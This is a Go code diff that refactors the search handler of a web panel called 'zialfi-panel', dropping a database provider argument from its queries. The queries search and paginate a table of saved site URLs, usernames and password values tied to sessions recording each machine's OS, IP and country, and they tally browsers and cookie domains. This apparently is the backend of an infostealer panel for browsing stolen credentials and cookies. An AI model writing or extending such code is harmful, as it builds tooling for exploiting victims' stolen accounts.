@@ -7,17 +7,16 @@ import (
 	"strconv"
 	"strings"
 
-	"zialfi-panel/internal/middleware"
 	"zialfi-panel/internal/db"
+	"zialfi-panel/internal/middleware"
 )
 
 type SearchHandler struct {
-	db      *sql.DB
-	provider     db.ProviderType
+	db *sql.DB
 }
 
-func NewSearchHandler(db *sql.DB, provider db.ProviderType) *SearchHandler {
-	return &SearchHandler{db: db, provider: provider}
+func NewSearchHandler(db *sql.DB) *SearchHandler {
+	return &SearchHandler{db: db}
 }
 
 type searchResult struct {
@@ -111,12 +110,12 @@ func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request) {
 				queryArgs = append(queryArgs, ownerArg)
 			}
 			var subTotal int
-			db.QueryRow(h.db, h.provider, qd.count, queryArgs...).Scan(&subTotal)
+			db.QueryRow(h.db, qd.count, queryArgs...).Scan(&subTotal)
 			total += subTotal
 
 			if subTotal > 0 {
 				qargs := append(queryArgs, perPage, offset)
-				rows, err := db.Query(h.db, h.provider, qd.query+" ORDER BY s.created_at DESC LIMIT ? OFFSET ?", qargs...)
+				rows, err := db.Query(h.db, qd.query+" ORDER BY s.created_at DESC LIMIT ? OFFSET ?", qargs...)
 				if err != nil {
 					continue
 				}
@@ -195,14 +194,14 @@ func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
 
 	countQuery := "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1" + sessionWhere
 	var total int
-	db.QueryRow(h.db, h.provider, countQuery, args...).Scan(&total)
+	db.QueryRow(h.db, countQuery, args...).Scan(&total)
 
 	offset := (page - 1) * perPage
 	dataQuery := fmt.Sprintf(`SELECT p.session_id, p.url, p.username, p.password_value, p.browser, s.os, s.ip, s.country_code, s.created_at
 		FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1%s ORDER BY s.created_at DESC LIMIT ? OFFSET ?`, sessionWhere)
 	qargs := append(args, perPage, offset)
 
-	rows, err := db.Query(h.db, h.provider, dataQuery, qargs...)
+	rows, err := db.Query(h.db, dataQuery, qargs...)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "search failed")
 		return
@@ -258,7 +257,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		whereClause = " WHERE 1=1 " + sessionWhere
 	}
 
-	rows, err := db.Query(h.db, h.provider, "SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+whereClause+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows, err := db.Query(h.db, "SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+whereClause+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows.Close()
 		for rows.Next() {
@@ -270,7 +269,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		}
 	}
 
-	rows2, err := db.Query(h.db, h.provider, "SELECT s.os, COUNT(*) as cnt FROM sessions s"+whereClause+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows2, err := db.Query(h.db, "SELECT s.os, COUNT(*) as cnt FROM sessions s"+whereClause+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows2.Close()
 		for rows2.Next() {
@@ -282,7 +281,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		}
 	}
 
-	rows3, err := db.Query(h.db, h.provider, "SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+whereClause+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows3, err := db.Query(h.db, "SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+whereClause+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows3.Close()
 		for rows3.Next() {
